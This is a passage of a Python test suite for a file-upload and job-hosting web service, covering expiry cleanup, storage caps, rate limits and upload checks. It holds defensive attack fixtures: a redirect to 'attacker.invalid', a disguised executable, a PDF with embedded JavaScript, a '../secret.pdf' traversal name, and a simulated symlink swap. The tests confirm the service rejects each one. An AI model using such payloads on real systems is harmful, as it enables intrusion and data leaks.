            (self.data_root / "mini" / "intakes.json").read_text(encoding="utf-8")
        )[intake_id]
        self.fail_session_delete = True
        expired_time = int(stored["updated_at"]) + 48 * 60 * 60 + 1

        with patch("mini_frank.time.time", return_value=expired_time):
            self.blueprint.mini_reconcile_once()

        self.assertEqual(
            self.client.get(f"/api/mini/intakes/{intake_id}", headers=headers).status_code,
            404,
        )
        self.assertEqual(
            self.client.put(
                f"/api/mini/intakes/{intake_id}/conversation",
                json={"conversation": [{"role": "user", "text": "Keep this forever."}]},
                headers=headers,
            ).status_code,
            404,
        )
        retained = json.loads(
            (self.data_root / "mini" / "intakes.json").read_text(encoding="utf-8")
        )[intake_id]
        self.assertEqual(retained["status"], "abandoned_cleanup_pending")

        self.fail_session_delete = False
        self.blueprint.mini_reconcile_once()
        remaining = json.loads(
            (self.data_root / "mini" / "intakes.json").read_text(encoding="utf-8")
        )
        self.assertNotIn(intake_id, remaining)

    def test_expiry_sweep_removes_job_intake_uploads_workspace_and_public_projection(self):
        intake_created = self.create_intake(conversation=[{
            "role": "user",
            "text": "Use my files to make a simple appointment booking solution.",
        }])
        intake_id = intake_created["intake"]["id"]
        intake_headers = self.claim_headers(intake_created)
        uploaded = self.client.post(
            f"/api/mini/intakes/{intake_id}/attachments",
            data={"files": (io.BytesIO(self.pdf_bytes()), "booking-brief.pdf", "application/pdf")},
            headers=intake_headers,
            content_type="multipart/form-data",
        )
        self.assertEqual(uploaded.status_code, 201)
        guide = self.client.post(
            f"/api/mini/intakes/{intake_id}/chat",
            json={"text": "Keep the booking details private and make the result very simple."},
            headers=intake_headers,
        )
        self.assertEqual(guide.status_code, 200)
        guide.data
        submitted = self.client.post(
            f"/api/mini/intakes/{intake_id}/submit", json={}, headers=intake_headers
        )
        self.assertEqual(submitted.status_code, 202)
        created = submitted.get_json()
        job_id = created["job"]["id"]
        job_headers = self.claim_headers(created)
        self.reconcile_job(job_id)
        self.write_v2_result(job_id)
        self.reconcile_job(job_id)
        ready = self.client.get(f"/api/mini/jobs/{job_id}", headers=job_headers)
        self.assertEqual(ready.get_json()["job"]["stage"], "ready")
        job_upload = self.client.post(
            f"/api/mini/jobs/{job_id}/attachments",
            data={"files": (io.BytesIO(b"new hours\n"), "change-notes.txt", "text/plain")},
            headers=job_headers,
            content_type="multipart/form-data",
        )
        self.assertEqual(job_upload.status_code, 201)

        intake_upload_dir = self.data_root / "mini-shared" / "attachments" / intake_id
        job_upload_dir = self.data_root / "mini-shared" / "attachments" / f"job-{job_id}"
        workspace = self.workspace(job_id)
        projection = self.project_root / job_id
        self.assertTrue(intake_upload_dir.is_dir())
        self.assertTrue(job_upload_dir.is_dir())
        self.assertTrue(workspace.is_dir())
        self.assertTrue(projection.is_dir())

        expires_at = self.stored_job(job_id)["expires_at"]
        with patch("mini_frank.time.time", return_value=expires_at + 1):
            self.blueprint.mini_sweep_once()

        self.assertFalse(intake_upload_dir.exists())
        self.assertFalse(job_upload_dir.exists())
        self.assertFalse(workspace.exists())
        self.assertFalse(projection.exists())
        self.assertNotIn(job_id, json.loads((self.data_root / "mini" / "jobs.json").read_text(encoding="utf-8")))
        self.assertNotIn(intake_id, json.loads((self.data_root / "mini" / "intakes.json").read_text(encoding="utf-8")))
        self.assertEqual(self.client.get(f"/api/mini/jobs/{job_id}", headers=job_headers).status_code, 404)
        self.assertCountEqual(
            self.deleted_sessions,
            [f"mini-intake-{intake_id}", f"mini-job-{job_id}"],
        )

    def test_expiry_withdraws_public_projection_before_remote_privacy_cleanup(self):
        created = self.create_job().get_json()
        job_id = created["job"]["id"]
        self.write_v2_result(job_id)
        self.blueprint.mini_reconcile_once()
        projection = self.project_root / job_id
        workspace = self.workspace(job_id)
        self.assertTrue(projection.is_dir())
        self.assertTrue(workspace.is_dir())

        self.fail_session_delete = True
        expires_at = self.stored_job(job_id)["expires_at"]
        with patch("mini_frank.time.time", return_value=expires_at + 1):
            self.blueprint.mini_sweep_once()

        self.assertFalse(projection.exists())
        self.assertTrue(workspace.is_dir())
        self.assertEqual(self.stored_job(job_id)["id"], job_id)
        self.assertEqual(self.stored_job(job_id)["stage"], "expired_cleanup_pending")
        self.assertEqual(
            self.client.get(
                f"/api/mini/jobs/{job_id}", headers=self.claim_headers(created)
            ).status_code,
            404,
        )
        self.assertFalse(projection.exists())

        self.fail_session_delete = False
        with patch("mini_frank.time.time", return_value=expires_at + 2):
            self.blueprint.mini_sweep_once()
        self.assertFalse(workspace.exists())
        self.assertNotIn(job_id, json.loads(
            (self.data_root / "mini" / "jobs.json").read_text(encoding="utf-8")
        ))

    def test_expired_linked_intake_cannot_reveal_itself_or_reissue_a_job_claim(self):
        intake_created = self.create_intake(conversation=[{
            "role": "user",
            "text": "Make a simple private appointment booking solution.",
        }])
        intake_id = intake_created["intake"]["id"]
        intake_headers = self.claim_headers(intake_created)
        submitted = self.client.post(
            f"/api/mini/intakes/{intake_id}/submit", json={}, headers=intake_headers
        )
        self.assertEqual(submitted.status_code, 202)
        job_id = submitted.get_json()["job"]["id"]
        self.blueprint.mini_reconcile_once()
        self.write_v2_result(job_id)
        self.blueprint.mini_reconcile_once()
        self.assertTrue((self.project_root / job_id).is_dir())

        self.fail_session_delete = True
        expires_at = self.stored_job(job_id)["expires_at"]
        with patch("mini_frank.time.time", return_value=expires_at + 1):
            self.blueprint.mini_sweep_once()

        reopened = self.client.get(f"/api/mini/intakes/{intake_id}", headers=intake_headers)
        repeated = self.client.post(
            f"/api/mini/intakes/{intake_id}/submit", json={}, headers=intake_headers
        )
        self.assertEqual(reopened.status_code, 404)
        self.assertEqual(repeated.status_code, 404)
        self.assertNotIn(b"claim_token", repeated.data)
        self.assertEqual(self.stored_job(job_id)["stage"], "expired_cleanup_pending")
        self.assertIn(
            intake_id,
            json.loads((self.data_root / "mini" / "intakes.json").read_text(encoding="utf-8")),
        )
        self.assertFalse((self.project_root / job_id).exists())

    def test_legacy_hosted_until_migration_preserves_an_unexpired_job(self):
        job_id = "legacyjob1"
        token = self.seed_legacy_job(job_id, hosted_until=2_000_000_000)
        old_preview = self.project_root / job_id
        old_preview.mkdir(parents=True)
        (old_preview / "index.html").write_text(
            '<meta http-equiv="refresh" content="0;url=https://attacker.invalid/">',
            encoding="utf-8",
        )
        old_source = self.legacy_project_root / job_id
        old_source.mkdir()
        (old_source / "result.json").write_text("private old result", encoding="utf-8")

        self.client = self.make_client()

        stored = self.stored_job(job_id)
        self.assertEqual(stored["expires_at"], 2_000_000_000)
        self.assertNotIn("hosted_until", stored)
        self.assertFalse(stored["legacy_migration_pending"])
        self.assertEqual(stored["stage"], "needs_attention")
        self.assertEqual(stored["dispatch_error"], "legacy_rebuild_required")
        self.assertFalse(old_preview.exists())
        self.assertTrue(old_source.is_dir())
        response = self.client.get(
            f"/api/mini/jobs/{job_id}", headers={"X-Mini-Claim": token}
        )
        self.assertEqual(response.status_code, 200)
        self.assertTrue(response.get_json()["job"]["retry_available"])

    def test_legacy_expiry_migration_falls_back_to_created_at_plus_retention(self):
        job_id = "legacyjob3"
        self.seed_legacy_job(job_id, hosted_until=0, created_at=1_900_000_000)

        self.client = self.make_client()

        stored = self.stored_job(job_id)
        self.assertEqual(stored["expires_at"], 1_900_000_000 + 30 * 24 * 60 * 60)
        self.assertNotIn("hosted_until", stored)

    def test_legacy_expired_job_and_customer_projects_output_are_privacy_cleaned_on_start(self):
        job_id = "legacyjob2"
        old_session_id = "old-random-hermes-session"
        self.seed_legacy_job(
            job_id,
            hosted_until=1_700_000_100,
            created_at=1_700_000_000,
            session_id=old_session_id,
        )
        legacy_output = self.legacy_project_root / job_id
        legacy_output.mkdir(parents=True)
        (legacy_output / "result.json").write_text("private legacy result", encoding="utf-8")

        with patch("mini_frank.time.time", return_value=1_800_000_000):
            self.client = self.make_client()

        jobs_path = self.data_root / "mini" / "jobs.json"
        remaining = json.loads(jobs_path.read_text(encoding="utf-8")) if jobs_path.exists() else {}
        self.assertNotIn(job_id, remaining)
        self.assertFalse(legacy_output.exists())
        self.assertCountEqual(
            self.deleted_sessions,
            [f"mini-job-{job_id}", old_session_id],
        )

    def test_expired_cleanup_tombstone_cannot_be_revived_by_dispatch(self):
        self.fail_next_run = True
        created = self.create_job().get_json()
        job_id = created["job"]["id"]
        jobs_path = self.data_root / "mini" / "jobs.json"
        jobs = json.loads(jobs_path.read_text(encoding="utf-8"))
        jobs[job_id]["expires_at"] = 1
        jobs[job_id]["stage"] = "queued"
        jobs[job_id]["run_id"] = ""
        jobs_path.write_text(json.dumps(jobs), encoding="utf-8")
        session_count = len(self.sessions)
        self.fail_session_delete = True

        with patch("mini_frank.time.time", return_value=2):
            self.blueprint.mini_sweep_once()
            response = self.client.post(
                f"/api/mini/jobs/{job_id}/dispatch",
                headers=self.claim_headers(created),
            )

        self.assertEqual(response.status_code, 404)
        stored = self.stored_job(job_id)
        self.assertEqual(stored["stage"], "expired_cleanup_pending")
        self.assertEqual(stored["run_id"], "")
        self.assertEqual(len(self.sessions), session_count)
        self.assertEqual(self.runs, [])

    def test_read_crossing_expiry_cannot_publish_and_renew_the_job(self):
        created = self.create_job().get_json()
        job_id = created["job"]["id"]
        self.write_v2_result(job_id)
        jobs_path = self.data_root / "mini" / "jobs.json"
        jobs = json.loads(jobs_path.read_text(encoding="utf-8"))
        deadline = 1_900_000_000
        jobs[job_id]["expires_at"] = deadline
        jobs_path.write_text(json.dumps(jobs), encoding="utf-8")
        self.fail_session_delete = True
        calls_before_read = len(self.hermes_calls)

        calls = 0

        def crossing_time():
            nonlocal calls
            calls += 1
            return deadline - 1 if calls == 1 else deadline + 1

        with patch("mini_frank.time.time", side_effect=crossing_time):
            response = self.client.get(
                f"/api/mini/jobs/{job_id}", headers=self.claim_headers(created)
            )

        self.assertEqual(response.status_code, 404)
        stored = self.stored_job(job_id)
        self.assertEqual(stored["stage"], "working")
        self.assertEqual(stored["expires_at"], deadline)
        self.assertFalse((self.project_root / job_id).exists())
        self.assertEqual(self.deleted_sessions, [])
        self.assertEqual(len(self.hermes_calls), calls_before_read)

    def test_due_reconciler_owns_the_expiry_transition(self):
        created = self.create_job().get_json()
        job_id = created["job"]["id"]
        jobs_path = self.data_root / "mini" / "jobs.json"
        jobs = json.loads(jobs_path.read_text(encoding="utf-8"))
        jobs[job_id]["expires_at"] = 1
        jobs_path.write_text(json.dumps(jobs), encoding="utf-8")
        self.fail_session_delete = True

        with patch("mini_frank.time.time", return_value=2):
            self.blueprint.mini_reconcile_once()

        stored = self.stored_job(job_id)
        self.assertEqual(stored["stage"], "expired_cleanup_pending")
        self.assertEqual(stored["expires_at"], 1)
        self.assertEqual(self.deleted_sessions, [])

    def test_abandon_always_deletes_the_derived_session_after_a_lost_create_response(self):
        created = self.create_intake()
        intake_id = created["intake"]["id"]

        deleted = self.client.delete(
            f"/api/mini/intakes/{intake_id}", headers=self.claim_headers(created)
        )

        self.assertEqual(deleted.status_code, 200)
        self.assertEqual(self.deleted_sessions, [f"mini-intake-{intake_id}"])

    def test_missing_hermes_run_becomes_retryable_instead_of_staying_working(self):
        created = self.create_job().get_json()
        job_id = created["job"]["id"]
        first_key = self.runs[-1]["payload"]["idempotency_key"]
        self.poll_http_status = 404
        self.reconcile_job(job_id)

        response = self.client.get(f"/api/mini/jobs/{job_id}", headers=self.claim_headers(created))

        self.assertEqual(response.status_code, 200)
        job = response.get_json()["job"]
        self.assertEqual(job["stage"], "needs_attention")
        self.assertTrue(job["retry_available"])
        retried = self.client.post(
            f"/api/mini/jobs/{job_id}/dispatch", headers=self.claim_headers(created)
        )
        self.assertEqual(retried.status_code, 202)
        second_key = self.runs[-1]["payload"]["idempotency_key"]
        self.assertTrue(first_key.endswith(":r1:g1"))
        self.assertTrue(second_key.endswith(":r1:g1"))

    def test_approval_blocked_run_waits_for_terminal_stop_before_retry(self):
        created = self.create_job().get_json()
        job_id = created["job"]["id"]
        self.poll_status = "waiting_for_approval"
        self.reconcile_job(job_id)

        response = self.client.get(f"/api/mini/jobs/{job_id}", headers=self.claim_headers(created))

        self.assertEqual(response.status_code, 200)
        job = response.get_json()["job"]
        self.assertEqual(job["stage"], "working")
        self.assertFalse(job["retry_available"])
        self.assertEqual(len(self.run_controls), 2)
        self.assertTrue(self.run_controls[0]["path"].endswith("/approval"))
        self.assertEqual(self.run_controls[0]["payload"], {"choice": "deny", "resolve_all": True})
        self.assertTrue(self.run_controls[1]["path"].endswith("/stop"))

        self.poll_status = "cancelled"
        self.reconcile_job(job_id)
        stopped = self.client.get(
            f"/api/mini/jobs/{job_id}", headers=self.claim_headers(created)
        ).get_json()["job"]
        self.assertEqual(stopped["stage"], "needs_attention")
        self.assertTrue(stopped["retry_available"])
        retried = self.client.post(
            f"/api/mini/jobs/{job_id}/dispatch", headers=self.claim_headers(created)
        )
        self.assertEqual(retried.status_code, 202)
        self.assertTrue(
            self.runs[-1]["payload"]["idempotency_key"].endswith(":r1:g2")
        )

    def test_claim_is_required_and_token_is_never_stored(self):
        created = self.create_job().get_json()
        job_id = created["job"]["id"]
        self.assertEqual(self.client.get(f"/api/mini/jobs/{job_id}").status_code, 404)
        stored = (self.data_root / "mini" / "jobs.json").read_text(encoding="utf-8")
        self.assertNotIn(created["claim_token"], stored)
        self.assertNotIn("claim_token", stored)

    def test_guide_inlines_private_images_and_bounds_document_context(self):
        created = self.create_intake()
        intake_id = created["intake"]["id"]
        headers = self.claim_headers(created)
        png = (
            b"\x89PNG\r\n\x1a\n"
            b"\x00\x00\x00\rIHDR\x00\x00\x00\x01\x00\x00\x00\x01\x08\x06\x00\x00\x00\x1f\x15\xc4\x89"
            b"\x00\x00\x00\x00IEND\xaeB`\x82"
        )
        uploaded = self.client.post(
            f"/api/mini/intakes/{intake_id}/attachments",
            data={"files": [
                (io.BytesIO(png), "counter.png", "image/png"),
                (io.BytesIO(b"day,requests\nMonday,4\n"), "requests.csv", "text/csv"),
            ]},
            headers=headers,
            content_type="multipart/form-data",
        )
        self.assertEqual(uploaded.status_code, 201)
        response = self.client.post(
            f"/api/mini/intakes/{intake_id}/chat",
            json={"text": "Please help me understand what is going wrong here."},
            headers=headers,
        )
        self.assertEqual(response.status_code, 200)
        response.data
        content = self.guide_turns[-1]["payload"]["message"]
        self.assertIsInstance(content, list)
        self.assertEqual(content[0]["type"], "input_text")
        self.assertIn("BEGIN UNTRUSTED ATTACHMENT CONTEXT", content[0]["text"])
        self.assertIn("Monday,4", content[0]["text"])
        self.assertNotIn(str(self.data_root), content[0]["text"])
        self.assertTrue(content[1]["image_url"].startswith("data:image/png;base64,"))

    def test_upload_rejects_executables_active_pdf_and_traversal_names(self):
        created = self.create_intake()
        intake_id = created["intake"]["id"]
        headers = self.claim_headers(created)
        cases = [
            (io.BytesIO(b"MZ" + b"\0" * 20), "setup.exe", "application/octet-stream"),
            (io.BytesIO(b"MZ" + b"\0" * 20), "holiday.png", "image/png"),
            (io.BytesIO(self.pdf_bytes(b"/JavaScript (alert)")), "active.pdf", "application/pdf"),
            (io.BytesIO(self.pdf_bytes()), "../secret.pdf", "application/pdf"),
        ]
        for stream, name, media_type in cases:
            response = self.client.post(
                f"/api/mini/intakes/{intake_id}/attachments",
                data={"files": (stream, name, media_type)},
                headers=headers,
                content_type="multipart/form-data",
            )
            self.assertIn(response.status_code, {400, 415}, name)
        intake = self.client.get(f"/api/mini/intakes/{intake_id}", headers=headers).get_json()["intake"]
        self.assertEqual(intake["attachment_count"], 0)

    def test_global_storage_cap_crosses_requesters_and_cleans_partial_upload(self):
        first_file = self.pdf_bytes(b"A" * 70_000)
        second_file = self.pdf_bytes(b"B" * 130_000)
        # Leave enough room for the rejected owner to materialize one 64 KiB
        # chunk, proving cleanup runs after a mid-stream aggregate rejection.
        cap = len(first_file) + (64 * 1024) + (16 * 1024)
        self.client = self.make_client(
            storage_cap_bytes=cap,
            storage_min_free_bytes=0,
        )
        first = self.create_intake(ip="203.0.113.201")
        second = self.create_intake(ip="203.0.113.202")

        accepted = self.client.post(
            f"/api/mini/intakes/{first['intake']['id']}/attachments",
            data={"files": (io.BytesIO(first_file), "first.pdf", "application/pdf")},
            headers=self.claim_headers(first),
            content_type="multipart/form-data",
        )
        rejected = self.client.post(
            f"/api/mini/intakes/{second['intake']['id']}/attachments",
            data={"files": (io.BytesIO(second_file), "second.pdf", "application/pdf")},
            headers=self.claim_headers(second),
            content_type="multipart/form-data",
        )

        self.assertEqual(accepted.status_code, 201)
        self.assertEqual(rejected.status_code, 507)
        self.assertNotIn("traceback", json.dumps(rejected.get_json()).lower())
        attachment_root = self.data_root / "mini-shared" / "attachments"
        self.assertEqual(len(list((attachment_root / first["intake"]["id"]).iterdir())), 1)
        self.assertFalse((attachment_root / second["intake"]["id"]).exists())
        self.assertEqual(list(attachment_root.glob(".stage-*")), [])
        latest = self.client.get(
            f"/api/mini/intakes/{second['intake']['id']}",
            headers=self.claim_headers(second),
        ).get_json()["intake"]
        self.assertEqual(latest["attachment_count"], 0)

    def test_anonymous_metadata_and_atomic_temp_peak_obey_the_storage_cap(self):
        self.client = self.make_client(
            storage_cap_bytes=1,
            storage_min_free_bytes=0,
        )
        rejected = self.client.post(
            "/api/mini/intakes",
            json={"conversation": [{"role": "user", "text": "X" * 4000}]},
            headers={"X-Real-IP": "2001:db8::1"},
        )
        self.assertEqual(rejected.status_code, 507)
        self.assertFalse((self.data_root / "mini" / "intakes.json").exists())

        self.client = self.make_client(storage_min_free_bytes=0)
        created = self.create_intake(
            ip="2001:db8::2",
            conversation=[{"role": "user", "text": "A small private problem."}],
        )
        metadata_root = self.data_root / "mini"
        used = sum(path.stat().st_size for path in metadata_root.iterdir() if path.is_file())
        before = (metadata_root / "intakes.json").read_bytes()
        self.client = self.make_client(
            storage_cap_bytes=used + 128,
            storage_min_free_bytes=0,
        )
        update = self.client.put(
            f"/api/mini/intakes/{created['intake']['id']}/conversation",
            json={"conversation": [{"role": "user", "text": "Y" * 4000}]},
            headers=self.claim_headers(created),
        )
        self.assertEqual(update.status_code, 507)
        self.assertEqual((metadata_root / "intakes.json").read_bytes(), before)
        self.assertFalse((metadata_root / "intakes.json.tmp").exists())

    def test_metadata_byte_caps_and_headroom_configuration_are_fail_closed(self):
        self.client = self.make_client(
            storage_cap_bytes=128 * 1024,
            storage_min_free_bytes=0,
            max_intake_store_bytes=256,
        )
        rejected = self.client.post(
            "/api/mini/intakes",
            json={"conversation": [{"role": "user", "text": "Z" * 2000}]},
            headers={"X-Real-IP": "2001:db8::3"},
        )
        self.assertEqual(rejected.status_code, 507)
        self.assertFalse((self.data_root / "mini" / "intakes.json").exists())

        with self.assertRaisesRegex(ValueError, "atomic rewrite"):
            self.make_client(
                storage_cap_bytes=128 * 1024,
                storage_min_free_bytes=0,
                metadata_headroom_bytes=16 * 1024,
                max_job_store_bytes=8 * 1024,
                max_intake_store_bytes=8 * 1024,
                max_rate_store_bytes=2 * 1024,
                metadata_write_margin_bytes=1024,
            )

    def test_reserved_metadata_headroom_keeps_privacy_tombstones_writable(self):
        cap = 128 * 1024
        headroom = 32 * 1024
        self.client = self.make_client(
            storage_cap_bytes=cap,
            storage_min_free_bytes=0,
            metadata_headroom_bytes=headroom,
            max_job_store_bytes=8 * 1024,
            max_intake_store_bytes=8 * 1024,
            max_rate_store_bytes=2 * 1024,
            metadata_write_margin_bytes=1024,
        )
        created = self.create_intake(
            ip="2001:db8::4",
            conversation=[{"role": "user", "text": "Delete this private draft."}],
        )
        intake_id = created["intake"]["id"]
        fence = self.blueprint.mini_storage_fence
        with fence.lock:
            used = fence._usage_locked()
        ordinary_cap = cap - headroom
        self.assertLess(used, ordinary_cap)
        filler = self.data_root / "mini-shared" / "ordinary-cap-fill.bin"
        filler.write_bytes(b"F" * (ordinary_cap - used))
        with self.assertRaises(MiniFrankStorageFull):
            fence.acquire(1, target=filler.parent)

        self.fail_session_delete = True
        deleted = self.client.delete(
            f"/api/mini/intakes/{intake_id}", headers=self.claim_headers(created)
        )
        self.assertEqual(deleted.status_code, 500)
        stored = json.loads(
            (self.data_root / "mini" / "intakes.json").read_text(encoding="utf-8")
        )[intake_id]
        self.assertEqual(stored["status"], "abandoned_cleanup_pending")
        self.assertFalse((self.data_root / "mini" / "intakes.json.tmp").exists())

    def test_global_record_and_event_caps_stop_rotating_requester_growth(self):
        self.client = self.make_client(
            max_intake_records=1,
            max_rate_events=10,
            storage_min_free_bytes=0,
        )
        first = self.client.post(
            "/api/mini/intakes", json={}, headers={"X-Real-IP": "2001:db8::10"}
        )
        second = self.client.post(
            "/api/mini/intakes", json={}, headers={"X-Real-IP": "2001:db8::11"}
        )
        self.assertEqual(first.status_code, 201)
        self.assertEqual(second.status_code, 507)
        stored = json.loads(
            (self.data_root / "mini" / "intakes.json").read_text(encoding="utf-8")
        )
        self.assertEqual(len(stored), 1)

    def test_planning_intakes_do_not_consume_the_private_build_ledger(self):
        self.client = self.make_client(
            max_intake_records=10,
            max_rate_events=1,
            storage_min_free_bytes=0,
        )
        accepted = self.client.post(
            "/api/mini/intakes", json={}, headers={"X-Real-IP": "2001:db8::20"}
        )
        second = self.client.post(
            "/api/mini/intakes", json={}, headers={"X-Real-IP": "2001:db8::21"}
        )
        self.assertEqual(accepted.status_code, 201)
        self.assertEqual(second.status_code, 201)
        self.assertFalse((self.data_root / "mini" / "rate-events.json").exists())

    def test_global_storage_reservation_is_atomic_across_parallel_owners(self):
        payload = self.pdf_bytes(b"C" * 70_000)
        self.client = self.make_client(
            storage_cap_bytes=len(payload) + (16 * 1024),
            storage_min_free_bytes=0,
        )
        owners = [
            self.create_intake(ip="203.0.113.211"),
            self.create_intake(ip="203.0.113.212"),
        ]
        app = self.client.application

        def upload(owner):
            with app.test_client() as client:
                response = client.post(
                    f"/api/mini/intakes/{owner['intake']['id']}/attachments",
                    data={"files": (io.BytesIO(payload), "parallel.pdf", "application/pdf")},
                    headers=self.claim_headers(owner),
                    content_type="multipart/form-data",
                )
                return response.status_code

        with ThreadPoolExecutor(max_workers=2) as pool:
            statuses = sorted(pool.map(upload, owners))
        self.assertEqual(statuses, [201, 507])

        stored_intakes = json.loads(
            (self.data_root / "mini" / "intakes.json").read_text(encoding="utf-8")
        )
        self.assertEqual(
            len({stored_intakes[owner["intake"]["id"]]["requester_hash"] for owner in owners}),
            2,
        )
        attachment_root = self.data_root / "mini-shared" / "attachments"
        self.assertEqual(len(list(attachment_root.rglob("*.pdf"))), 1)
        self.assertEqual(list(attachment_root.glob(".stage-*")), [])

    def test_storage_minimum_free_space_guard_rejects_before_persisting(self):
        self.client = self.make_client(
            storage_cap_bytes=1024 * 1024,
            storage_min_free_bytes=4096,
        )
        created = self.create_intake(ip="203.0.113.221")
        with patch(
            "mini_frank.shutil.disk_usage",
            return_value=SimpleNamespace(free=4095),
        ):
            response = self.client.post(
                f"/api/mini/intakes/{created['intake']['id']}/attachments",
                data={"files": (io.BytesIO(self.pdf_bytes()), "brief.pdf", "application/pdf")},
                headers=self.claim_headers(created),
                content_type="multipart/form-data",
            )
        self.assertEqual(response.status_code, 507)
        attachment_root = self.data_root / "mini-shared" / "attachments"
        self.assertEqual(list(attachment_root.glob(".stage-*")), [])
        self.assertFalse((attachment_root / created["intake"]["id"]).exists())

    def test_storage_fence_counts_workspaces_and_public_projections_together(self):
        shared = self.data_root / "mini-shared"
        workspace = shared / "workspaces" / "aggregate-test"
        projection = self.project_root / "aggregate-test"
        workspace.mkdir(parents=True, exist_ok=True)
        projection.mkdir(parents=True, exist_ok=True)
        (workspace / "workspace.bin").write_bytes(b"W" * 64 * 1024)
        (projection / "public.bin").write_bytes(b"P" * 64 * 1024)
        fence = MiniFrankStorageFence(
            [shared, self.project_root],
            cap_bytes=128 * 1024,
            min_free_bytes=0,
        )

        with self.assertRaises(MiniFrankStorageFull):
            with fence.reserve(1, target=shared):
                self.fail("aggregate storage beyond the cap was admitted")

    def test_invalid_revision_is_not_treated_as_the_current_result(self):
        created = self.create_job().get_json()
        job_id = created["job"]["id"]
        self.write_v2_result(job_id, revision=2)
        job = self.client.get(f"/api/mini/jobs/{job_id}", headers=self.claim_headers(created)).get_json()["job"]
        self.assertNotIn("result", job)
        self.assertFalse((self.project_root / job_id).exists())

    def test_failed_initial_dispatch_is_retryable_and_preserves_the_request(self):
        self.fail_next_run = True
        created_response = self.create_job()
        self.assertEqual(created_response.status_code, 202)
        created = created_response.get_json()
        self.assertEqual(created["job"]["stage"], "queued")
        self.assertFalse(created["job"]["retry_available"])
        retried = self.client.post(
            f"/api/mini/jobs/{created['job']['id']}/dispatch", headers=self.claim_headers(created)
        )
        self.assertEqual(retried.status_code, 202)
        self.assertEqual(retried.get_json()["job"]["stage"], "working")

    def test_ambiguous_build_keeps_storage_reserved_until_confirmed_terminal(self):
        self.fail_next_run = True
        created = self.create_job(ip="203.0.113.231").get_json()
        job_id = created["job"]["id"]
        self.assertTrue(self.stored_job(job_id)["storage_reserved"])

        accepted = self.client.post(
            f"/api/mini/jobs/{job_id}/dispatch",
            headers=self.claim_headers(created),
        )
        self.assertEqual(accepted.status_code, 202)
        self.assertTrue(self.stored_job(job_id)["storage_reserved"])

        self.poll_status = "cancelled"
        self.reconcile_job(job_id)
        terminal = self.client.get(
            f"/api/mini/jobs/{job_id}",
            headers=self.claim_headers(created),
        )
        self.assertEqual(terminal.status_code, 200)
        self.assertFalse(self.stored_job(job_id)["storage_reserved"])

    def test_ambiguous_retry_never_restages_private_files_through_an_active_workspace_link(self):
        intake = self.create_intake(conversation=[{
            "role": "user",
            "text": "Use my private brief to solve the booking problem.",
        }])
        intake_id = intake["intake"]["id"]
        intake_headers = self.claim_headers(intake)
        private_pdf = self.pdf_bytes(b"PRIVATE-CONTENT")
        uploaded = self.client.post(
            f"/api/mini/intakes/{intake_id}/attachments",
            data={"files": (io.BytesIO(private_pdf), "private-brief.pdf", "application/pdf")},
            headers=intake_headers,
            content_type="multipart/form-data",
        )
        self.assertEqual(uploaded.status_code, 201)
        attachment_id = uploaded.get_json()["intake"]["attachments"][0]["id"]

        # Model an accepted run whose HTTP response was lost. Its sandbox can
        # still be live while Window retries the same idempotency generation.
        self.fail_next_run = True
        submitted = self.client.post(
            f"/api/mini/intakes/{intake_id}/submit",
            json={},
            headers=intake_headers,
        )
        self.assertEqual(submitted.status_code, 202)
        created = submitted.get_json()
        job_id = created["job"]["id"]
        self.reconcile_job(job_id)
        self.assertTrue(self.stored_job(job_id)["storage_reserved"])

        workspace = self.workspace(job_id)
        private_dir = workspace / "private"
        staged_dir = private_dir / "attachments"
        leaked = self.project_root / "attachments" / f"{attachment_id}.pdf"
        # The live isolated executor replaces Window's private directory with a
        # link whose absolute target resolves to the trusted preview root only
        # in Window's mount namespace. A retry must not follow or restage it.
        self.replace_with_directory_link(private_dir, self.project_root)
        self.assertEqual(private_dir.resolve(), self.project_root.resolve())
        original_shared_private_dir = __import__("mini_frank")._shared_private_dir
        attacker_ran = False

        def active_sandbox_swap(path):
            nonlocal attacker_ran
            path = Path(path)
            if path == staged_dir and not attacker_ran:
                attacker_ran = True
                self.replace_with_directory_link(private_dir, self.project_root)
            return original_shared_private_dir(path)

        with patch("mini_frank._shared_private_dir", side_effect=active_sandbox_swap):
            retried = self.client.post(
                f"/api/mini/jobs/{job_id}/dispatch",
                headers=self.claim_headers(created),
            )

        self.assertEqual(retried.status_code, 202)
        self.assertFalse(attacker_ran, "Window restaged files while an ambiguous run could still be active")
        self.assertFalse(leaked.exists())

    def test_background_reconcile_automatically_retries_a_queued_job_without_a_run(self):
        self.fail_next_run = True
        created = self.create_job().get_json()
        job_id = created["job"]["id"]
        self.assertEqual(created["job"]["stage"], "queued")
        self.assertEqual(len(self.runs), 0)
        with patch("mini_frank.AUTO_DISPATCH_RETRY_DELAYS", (0, 0, 0, 0, 0)):
            self.reconcile_job(job_id)
        stored = self.stored_job(job_id)
        self.assertEqual(stored["stage"], "working")
        self.assertEqual(stored["run_id"], "run-1")
        self.assertEqual(len(self.runs), 1)

    def test_json_errors_and_active_project_limit_remain_publicly_safe(self):
        malformed = self.client.post("/api/mini/jobs", data="{", content_type="application/json")
        self.assertEqual(malformed.status_code, 400)
        self.assertTrue(malformed.is_json)
        self.client = self.make_client(free_project_limit=1)
        self.assertEqual(self.create_job(ip="203.0.113.99").status_code, 202)
        limited = self.create_job(ip="203.0.113.99")
        self.assertEqual(limited.status_code, 402)
        self.assertEqual(limited.get_json()["code"], "project_limit_reached")
        self.assertEqual(limited.get_json()["additional_projects"], "paid")
        self.assertIn("paid feature", limited.get_json()["error"])
        self.assertNotIn("traceback", json.dumps(limited.get_json()).lower())

    def test_rate_ledger_atomically_caps_parallel_events_and_expires_private_entries(self):
        path = self.data_root / "mini" / "rate-events.json"
        ledger = MiniFrankRateLedger(path)
        with ThreadPoolExecutor(max_workers=12) as pool:
            accepted = list(pool.map(
                lambda _: ledger.try_record("requester-hash", "guide", limit=3, now=1_000_000),
                range(24),
            ))
        self.assertEqual(sum(accepted), 3)
        stored = json.loads(path.read_text(encoding="utf-8"))
        self.assertEqual(len(stored), 3)
        self.assertTrue(all(set(event) == {"requester_hash", "kind", "created_at"} for event in stored))

        self.assertTrue(ledger.try_record(
            "requester-hash", "guide", limit=3, now=1_000_000 + RATE_WINDOW_SECONDS + 1
        ))
        self.assertEqual(json.loads(path.read_text(encoding="utf-8")), [{
            "requester_hash": "requester-hash",
            "kind": "guide",
            "created_at": 1_000_000 + RATE_WINDOW_SECONDS + 1,
        }])

    def test_deleted_intakes_never_consume_the_project_entitlement(self):
        self.client = self.make_client(free_project_limit=1)
        ip = "203.0.113.144"
        for _ in range(10):
            created = self.create_intake(ip=ip)
            deleted = self.client.delete(
                f"/api/mini/intakes/{created['intake']['id']}",
                headers=self.claim_headers(created),
            )
